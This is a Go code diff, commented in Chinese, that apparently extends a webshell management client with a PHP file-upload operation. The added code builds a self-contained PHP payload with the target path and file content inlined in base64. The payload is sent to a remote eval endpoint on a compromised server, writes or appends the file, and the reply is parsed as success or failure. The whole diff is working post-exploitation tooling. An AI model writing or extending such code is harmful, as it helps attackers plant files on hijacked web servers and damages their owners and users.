@@ -112,6 +112,76 @@ func (p *phpFileRead) Parse(ctx context.Context, resp *core.Response) (core.Resu
 	return parseFileRead(p.target, resp.Body), nil
 }
 
+// phpFileUpload 是 FileUpload 操作的 PHP 适配器版本。
+// 用自包含方案把 remote_path 和 file_content 都 base64 内联进 PHP 源码里，
+// 这样远端 eval 即可写出文件，不依赖任何外部 POST 字段。
+type phpFileUpload struct {
+	tpl      *PHPTemplates
+	remote   string
+	content  []byte
+	append   bool
+}
+
+// NewPhpFileUpload 构建一个 PHP 兼容的 FileUpload 操作。
+func NewPhpFileUpload(remotePath string, content []byte) *phpFileUpload {
+	return &phpFileUpload{
+		tpl:     NewPHPTemplates(),
+		remote:  remotePath,
+		content: content,
+		append:  false,
+	}
+}
+
+func (p *phpFileUpload) Name() string { return "file.upload" }
+
+func (p *phpFileUpload) RiskLevel() core.RiskLevel { return core.RiskWrite }
+
+// WithAppend 切换为追加模式（默认覆盖）。
+func (p *phpFileUpload) WithAppend(on bool) *phpFileUpload {
+	p.append = on
+	return p
+}
+
+func (p *phpFileUpload) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
+	req := core.NewRequest(p.Name())
+
+	remoteB64 := b64(p.remote)
+	contentB64 := b64(string(p.content))
+
+	// 自包含 PHP 源码：把路径和内容都 base64 内联，eval 即可写出文件。
+	flag := "w"
+	if p.append {
+		flag = "a"
+	}
+	code := "" +
+		"$p=base64_decode('" + remoteB64 + "');" +
+		"$c=base64_decode('" + contentB64 + "');" +
+		"$f=@fopen($p,'" + flag + "');" +
+		"if($f===false){echo \"0\";exit;}" +
+		"$n=@fwrite($f,$c);" +
+		"@fclose($f);" +
+		"if($n===false){echo \"0\";}else{echo \"1\";}"
+
+	_ = p.tpl // 保留引用避免 unused
+
+	req.Payload = []byte(code)
+	req.Meta["adapter"] = "php"
+	return req, nil
+}
+
+func (p *phpFileUpload) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
+	if resp == nil {
+		return nil, errors.New("phpFileUpload.Parse: 响应为空")
+	}
+	trimmed := string(resp.Body)
+	ok := trimmed == "1" || trimmed == "ok"
+	return &core.BoolResult{
+		BaseResult: core.NewBaseResult("file.upload", resp.Body),
+		OK:         ok,
+		Message:    trimmed,
+	}, nil
+}
+
 // phpExec 是 Exec 操作的 PHP 适配器版本。
 type phpExec struct {
 	tpl    *PHPTemplates
